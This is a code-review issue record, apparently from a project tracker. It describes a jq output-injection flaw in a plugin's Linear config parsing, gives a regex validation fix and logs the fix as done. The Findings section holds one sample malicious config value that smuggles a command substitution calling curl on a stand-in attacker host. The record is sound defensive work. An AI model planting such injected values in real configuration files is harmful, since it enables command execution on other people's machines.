---
status: complete
priority: p2
issue_id: "051"
tags: [code-review, security, injection]
dependencies: []
pr_number: 12
---

# 🟡 P2: jq Output Injection in Linear Config Parsing

## Problem Statement

The sync command reads Linear configuration using `jq -r` (raw output) without validating values. Malicious config with newlines or shell metacharacters could enable command execution.

## Findings

**Location**: `plugins/yellow-debt/commands/debt/sync.md:91-94`

**Current**: Direct jq parsing with no validation:
```bash
TEAM_ID=$(jq -r '.team_id' "$CONFIG_FILE")
TEAM_NAME=$(jq -r '.team_name' "$CONFIG_FILE")
```

**Attack**: Config with `"team_name": "Eng\n$(curl attacker.com)"` could execute on `printf '%s' "$TEAM_NAME"`

**Source**: Security Sentinel H4

## Proposed Solutions

### Solution 1: Validate UUID and Name Formats

```bash
# Validate UUIDs
[[ "$TEAM_ID" =~ ^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$ ]] || exit 1

# Validate names (alphanumeric, spaces, hyphens, max 100 chars)
[[ "$TEAM_NAME" =~ ^[a-zA-Z0-9 -]{1,100}$ ]] || exit 1
```

**Effort**: Small (30 min)

## Recommended Action

Add validation after jq parsing.

## Acceptance Criteria

- [ ] UUID format validation for team_id and project_id
- [ ] Name format validation (alphanumeric + space + hyphen only)
- [ ] Max length check (100 chars)
- [ ] Test with malicious config fails safely

## Resources

- Security audit: `docs/solutions/security-issues/yellow-debt-plugin-security-audit.md:637-716`

### 2026-02-13 - Approved for Work
**By:** Triage Session
**Actions:**
- Issue approved during code review triage
- Status changed from pending → ready
- Ready to be picked up and worked on

### 2026-02-13 - Completed
**By:** pr-comment-resolver
**Actions:**
- Implemented Solution 1 (UUID and name format validation)
- Added validation after jq parsing at lines 96-116
- UUID format validation for team_id and project_id (RFC 4122 format)
- Name format validation (alphanumeric + space + hyphen only, max 100 chars)
- All validation errors exit with descriptive error messages
- Status changed from ready → done
